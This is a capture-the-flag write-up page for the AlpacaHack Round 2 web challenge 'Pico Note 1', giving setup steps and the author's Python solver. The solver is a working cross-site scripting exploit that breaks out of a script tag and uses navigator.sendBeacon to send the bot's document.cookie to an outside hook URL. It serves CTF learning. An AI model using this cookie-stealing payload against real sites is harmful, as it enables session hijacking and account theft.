---
title: "Pico Note 1 - AlpacaHack Round 2 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "pico", "note", "web", "alpacahack-round-2"]
summary: "The template engine is very simple but powerful 🔥"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/pico-note-1"
license: "none stated"
ctf:
  name: "AlpacaHack Round 2"
  year: 2024
  challenge: "Pico Note 1"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/pico-note-1>
- **CTF:** AlpacaHack Round 2 2024

---

# [web] Pico Note 1

## Description

The template engine is very simple but powerful 🔥

## Attachments

- [pico-note-2](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/pico-note-1/solution/solve.py>

```python
import os
import httpx
import urllib.parse

HOST = os.getenv("HOST", "localhost")
BOT_PORT = int(os.getenv("BOT_PORT", 1337))
WEB_PORT = int(os.getenv("WEB_PORT", 3000))

HOOK_URL = os.environ["HOOK_URL"]

client = httpx.Client(base_url=f"http://{HOST}:{BOT_PORT}")

res = client.post(
    "/api/report",
    json={
        "url": f"http://web:3000/note?title={urllib.parse.quote(f"</script>$`navigator.sendBeacon('{HOOK_URL}?' + document.cookie);</script>")}",
    },
    timeout=10,
)
print(res.text)
```
